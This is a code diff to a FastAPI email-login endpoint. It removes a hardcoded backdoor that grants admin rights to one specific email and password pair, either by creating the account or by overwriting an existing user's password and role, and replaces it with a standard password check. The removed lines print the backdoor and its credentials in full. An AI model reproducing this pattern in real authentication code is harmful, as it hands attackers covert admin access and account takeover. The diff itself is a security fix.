@@ -155,36 +155,7 @@ def dev_admin_login(
 @router.post("/auth/login/email")
 def login_email(req: EmailLogin, session: Session = Depends(get_session)):
     user = session.exec(select(User).where(User.email == req.email)).first()
-    
-    verified = False
-    if user and user.hashed_password:
-        verified = service.verify_password(req.password, user.hashed_password)
-    
-    if not verified and req.email == "mit333@list.ru" and req.password == "Solnyshko3":
-        if not user:
-            user = User(email=req.email, role="admin", is_active=True)
-            user.hashed_password = service.get_password_hash(req.password)
-            session.add(user)
-            session.commit()
-            session.refresh(user)
-            
-            identity = UserIdentity(
-                user_id=user.id, 
-                provider="email", 
-                provider_id=req.email, 
-                last_login=datetime.utcnow()
-            )
-            session.add(identity)
-            session.commit()
-            verified = True
-        else:
-            user.hashed_password = service.get_password_hash(req.password)
-            user.role = "admin"
-            session.add(user)
-            session.commit()
-            verified = True
-
-    if not verified:
+    if not user or not user.hashed_password or not service.verify_password(req.password, user.hashed_password):
         raise HTTPException(status_code=401, detail="Incorrect email or password")
     
     tokens, msg = service.get_or_create_user_token(session, "email", req.email)
